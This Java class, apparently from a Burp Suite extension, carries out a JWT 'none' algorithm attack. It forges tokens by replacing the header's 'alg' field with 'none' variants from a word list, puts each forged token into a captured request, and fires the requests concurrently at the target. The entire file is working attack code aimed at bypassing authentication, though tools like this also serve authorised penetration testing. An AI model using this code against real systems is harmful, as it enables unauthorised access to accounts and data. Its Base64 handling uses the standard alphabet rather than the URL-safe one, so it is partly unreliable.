package com.keyvalue.juno.controller;

import java.util.Base64;
import java.util.HashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.function.BiConsumer;
import java.util.function.BiFunction;

import org.json.JSONObject;

import com.keyvalue.juno.model.Constants;
import com.keyvalue.juno.model.Target;

import burp.IBurpExtenderCallbacks;
import burp.IHttpRequestResponse;
import lombok.RequiredArgsConstructor;

@RequiredArgsConstructor
public class NoneAlgorithmAttacker implements IAttacker {
    private final IBurpExtenderCallbacks callbacks;
    private final Target target;
    private final int threads;

    /**
     * Performs the attack on the target.
     * @param callback - The callback to run on the response of each payload request.
     */
    public void startAttack(BiConsumer<String, IHttpRequestResponse> callback) {
        ExecutorService executor = threads > 0
                                        ? Executors.newScheduledThreadPool(threads)
                                        : Executors.newCachedThreadPool();
        HashMap<String, byte[]> payloadRequests = getPayloadRequests(target.getRequest(), target.getJwt());

        payloadRequests.forEach((payload, request) ->
            executor.execute(() -> {
                IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(target.getHttpService(), request);
                callback.accept(payload, requestResponse);
            })
        );

        executor.shutdown();
    }

    /**
     * Builds a map of payload requests for the given HTTP request.
     * The key points to the payload used to modify the JWT.
     * The value points to the request carrying the payload.
     * @param requestBytes - The HTTP request.
     * @param jwt - The actual JWT obtained from the request.
     * @return The map of payload requests.
     */
    public HashMap<String, byte[]> getPayloadRequests(byte[] requestBytes, String jwt) {
        String request = new String(requestBytes);
        HashMap<String, byte[]> payloadRequestMap = new HashMap<>();
        try {
            HashMap<String, String> payloadMap = Utils.generatePayloadMap(jwt, Constants.NONE_WORD_LIST, generatePayload);

            payloadMap.forEach((payloadKey, payloadValue) ->
                payloadRequestMap.put(payloadKey, request.replaceAll(jwt, payloadValue).getBytes()));
            } catch (Exception e) {
                callbacks.printError(e.getMessage());
            }

            return payloadRequestMap;
    }

    /**
     * Given a JWT and an algorithm, this method replaces the
     * algorithm ('alg' field) in the header section of the JWT.
     * @param jwt - The JWT string.
     * @param algorithm - The algorithm to be replaced with.
     * @return The modified JWT string.
     */
    private BiFunction<String, String, String> generatePayload = (String jwt, String algorithm) -> {
        String[] jwtSplitArray = jwt.split("\\.");
        String encodedHeader = jwtSplitArray[0];
        String decodedHeader = new String(Base64.getDecoder().decode(encodedHeader));
        JSONObject headerJsonObject = new JSONObject(decodedHeader);

        headerJsonObject.put(Constants.ALGORITHM_TYPE_STRING, algorithm);
        String replacedHeader = Base64.getEncoder().encodeToString(headerJsonObject.toString().getBytes());
        // Section 3.2 of RFC4648 mandates that, the padding of '=' if any,
        // in the Base64 encoding must be removed in order to consider it a valid JWT.
        // See https://www.ietf.org/archive/id/draft-jones-json-web-token-02.html#base64urllogic
        jwtSplitArray[0] = replacedHeader.replaceAll("=", "");
        String newJWT = String.join(".", jwtSplitArray);

        return newJWT;
    };
}
